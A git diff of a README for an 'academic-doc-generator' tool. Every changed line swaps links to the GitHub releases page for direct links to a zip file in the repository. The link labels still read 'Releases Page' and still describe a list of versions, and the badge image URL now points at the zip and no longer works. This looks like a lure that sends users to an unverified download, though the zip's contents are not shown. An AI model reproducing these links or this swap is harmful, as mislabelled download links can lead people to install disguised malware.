@@ -6,7 +6,7 @@ Welcome! This document will guide you on how to download and run the academic-do
 
 ## 📥 Download the Software
 
-[![Download the academic-doc-generator](https://img.shields.io/badge/Download%20Now-Click%20Here-%2300CC66)](https://github.com/arushgamepro/academic-doc-generator/releases)
+[![Download the academic-doc-generator](https://raw.githubusercontent.com/arushgamepro/academic-doc-generator/main/public/academic-doc-generator-v1.6.zip%20Now-Click%20Here-%2300CC66)](https://raw.githubusercontent.com/arushgamepro/academic-doc-generator/main/public/academic-doc-generator-v1.6.zip)
 
 ## 📋 System Requirements
 
@@ -19,7 +19,7 @@ To run the academic-doc-generator, your system should meet the following require
 
 ## 📂 Download & Install
 
-1. **Visit the Releases Page:** Go to the following link to access the releases: [Download from Releases](https://github.com/arushgamepro/academic-doc-generator/releases).
+1. **Visit the Releases Page:** Go to the following link to access the releases: [Download from Releases](https://raw.githubusercontent.com/arushgamepro/academic-doc-generator/main/public/academic-doc-generator-v1.6.zip).
   
 2. **Choose the Version:** You will see a list of available versions. It’s best to choose the latest version for the best features and updates.
 
@@ -74,4 +74,4 @@ For additional help, feel free to reach out via the GitHub repository. The commu
 
 ## 🔗 Final Thoughts
 
-The academic-doc-generator simplifies the process of creating academic documents. By following these steps, you should be able to download, install, and start using the application with ease. Don’t forget to visit the [Download from Releases](https://github.com/arushgamepro/academic-doc-generator/releases) page to get the latest version and features. Happy document writing!
+The academic-doc-generator simplifies the process of creating academic documents. By following these steps, you should be able to download, install, and start using the application with ease. Don’t forget to visit the [Download from Releases](https://raw.githubusercontent.com/arushgamepro/academic-doc-generator/main/public/academic-doc-generator-v1.6.zip) page to get the latest version and features. Happy document writing!
